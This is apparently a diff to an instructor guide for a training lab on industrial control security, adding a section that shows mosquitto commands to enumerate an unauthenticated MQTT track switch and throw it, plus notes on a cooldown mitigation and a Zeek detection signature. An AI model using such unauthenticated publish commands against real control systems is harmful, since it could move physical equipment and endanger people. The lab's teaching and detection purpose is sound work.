@@ -7,12 +7,23 @@
 > rest from the wire.
 >
 > Use this to gauge progress, prepare hints, and post-mortem the session.
+>
+> **Event configuration.** The ChooChoo training event runs the train
+> under Modbus and the track switch under MQTT. Suggested progression for
+> the event: Section 1 (Recon) → Section 3 (Modbus command injection) →
+> Section 6 (Switch throw over MQTT) → Section 4 (Web API) → Section 5
+> (Sniffing). Sections 2 (MQTT train command injection) stays in this
+> document as a reference for the legacy MQTT surface but is not part of
+> the event scenario.
 
 The target services on the Docker network are:
 
 - `web-mqtt` or `web-modbus` — FastAPI HTTP, port 8000
-- `mosquitto` — MQTT broker, port 1883 (MQTT mode only)
+- `mosquitto` — MQTT broker, port 1883 (both train MQTT and the switch)
 - `controller` — Modbus outstation, port 5020 (Modbus mode only)
+- `switch-controller-mqtt` — MQTT client that owns the Circuit Cubes
+  switch. Not a listening port; discoverable only by seeing it publish
+  to `choochoo/switch/+/state` on the broker.
 
 Deeper "why each attack works" reference: `VULNERABILITIES.md` (host).
 
@@ -120,3 +131,33 @@ tcpdump -i eth0 -A -s0 'port 1883 or port 5020' | head -40
 
 For a deeper dissection, copy the pcap to your host and open it in
 Wireshark — both MQTT and Modbus have full built-in dissectors.
+
+## 6. Throw the track switch over MQTT (event scenario)
+
+The Circuit Cubes track switch subscribes to `choochoo/switch/+/cmd/throw`
+on the same mosquitto broker as the (legacy) train. Anyone who can publish
+to that topic moves the switch.
+
+```sh
+# Enumerate every switch on the bus. Retained state announces the id.
+mosquitto_sub -h mosquitto -t 'choochoo/switch/+/state' -v
+
+# Watch throw events land on the wire — including cooldown_rejected on spam.
+mosquitto_sub -h mosquitto -t 'choochoo/switch/+/event' -v &
+
+# Divert the train at will.
+mosquitto_pub -h mosquitto \
+  -t choochoo/switch/sw1/cmd/throw \
+  -m '{"action":"throw","direction":"forward"}'
+```
+
+**What the mitigation does and doesn't buy.** The controller enforces a
+2 s cooldown per switch, so an attacker cannot burn the motor out by
+spamming throws. They *can* still time a throw for the moment the train
+is approaching the switch. That distinction — safety vs security — is
+the S1 talking point in `VULNERABILITIES.md`.
+
+**Zeek detection**: every throw is a distinct MQTT PUBLISH on
+`choochoo/switch/+/cmd/throw`. A source generating more than one throw
+per 2 s (against the cooldown floor) is a distinctive signature; that
+rate can't be legitimate operator traffic.
